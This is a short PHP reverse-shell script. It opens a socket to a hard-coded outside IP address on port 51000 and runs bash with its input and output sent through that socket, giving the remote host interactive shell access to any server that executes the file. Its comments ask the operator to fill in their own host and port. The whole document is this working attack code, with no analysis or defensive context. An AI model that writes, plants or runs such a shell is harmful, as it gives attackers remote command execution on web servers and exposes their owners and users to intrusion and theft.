<?php
// Set your LHOST and LPORT here
$host = '107.175.243.19';  // Replace with your IP address
$port = 51000;   		   // Replace with your port number

// Create a socket connection
$sock = fsockopen($host, $port);
if ($sock) {
    // Redirect input/output to the socket
    passthru("bash <&3 >&3 2>&3");
}
?>
